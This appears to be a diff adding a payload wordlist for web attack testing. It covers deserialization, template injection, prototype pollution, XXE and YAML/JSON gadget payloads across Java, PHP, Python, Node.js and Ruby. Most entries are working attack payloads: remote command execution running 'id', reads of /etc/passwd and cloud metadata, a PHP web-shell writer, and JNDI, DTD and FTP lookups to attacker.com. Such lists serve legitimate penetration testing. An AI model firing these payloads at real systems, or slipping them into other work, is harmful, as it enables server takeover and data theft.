@@ -1,0 +1,130 @@
+# ── Java Deserialization ──
+# Ysoserial-style payloads (base64 encoded gadget chains)
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+# Trigger patterns to detect in responses
+java.io.IOException
+java.lang.ClassNotFoundException
+java.lang.reflect.InvocationTargetException
+org.apache.commons.collections
+com.sun.org.apache.xalan
+
+# ── PHP Deserialization ──
+O:8:"stdClass":0:{}
+O:4:"User":1:{s:4:"name";s:5:"admin";}
+a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
+O:8:"stdClass":1:{s:4:"exec";s:2:"id";}
+# PHP object injection
+O:14:"GuzzleHttp\Psr7":1:{s:4:"data";O:8:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"handler";N;s:13:"bufferSize";i:-1;s:6:"buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:5:"level";N;s:14:"initialized";b:1;s:14:"bufferLimit";i:-1;s:10:"processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"bufferSize";i:-1;s:6:"buffer";a:0:{}s:5:"level";N;s:14:"initialized";b:0;s:14:"bufferLimit";i:-1;s:10:"processors";a:0:{}}}}
+
+# ── Python Pickle Deserialization ──
+# Pickle RCE payload (base64)
+gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
+cos
+system
+(S'id'
+tR.
+
+# ── Node.js Deserialization ──
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}
+{"__proto__":{"polluted":"yes"}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+
+# ── SSTI - Server Side Template Injection ──
+# Generic detection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{7*'7'}}
+${{7*7}}
+#{7*7}
+@(7+7)
+`7*7`
+
+# Jinja2 (Python/Flask)
+{{config}}
+{{config.items()}}
+{{settings.SECRET_KEY}}
+{{request.environ}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.setCache("ftp://attacker.com/x")}}{{_self.env.loadTemplate("x")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+
+# Freemarker (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# Velocity (Java)
+#set($x='')##
+#set($rt=$x.class.forName('java.lang.Runtime'))
+#set($chr=$x.class.forName('java.lang.Character'))
+#set($str=$x.class.forName('java.lang.String'))
+#set($ex=$rt.getRuntime().exec('id'))
+
+# Smarty (PHP)
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+# Pebble (Java)
+{{variable.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(variable.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}
+
+# Mako (Python)
+${__import__('os').popen('id').read()}
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+
+# ERB (Ruby)
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+
+# ── Prototype Pollution (JavaScript) ──
+{"__proto__":{"admin":true}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"role":"admin"}}
+{"constructor":{"prototype":{"admin":true}}}
+{"__proto__":{"polluted":"yes"}}
+?__proto__[admin]=true
+?__proto__[isAdmin]=true
+?constructor[prototype][admin]=true
+?__proto__.admin=true
+
+# ── XML Deserialization ──
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<foo>test</foo>
+
+# ── YAML Deserialization ──
+!!python/object/apply:os.system ["id"]
+!!python/object/apply:subprocess.check_output [["id"]]
+!!java.lang.ProcessBuilder [["id"]]
+--- !ruby/object:Gem::Installer
+  i: x
+--- !ruby/object:Gem::SpecFetcher
+  i: x
+
+# ── JSON Deserialization ──
+{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
+{"@type":"java.net.InetAddress","val":"attacker.com"}
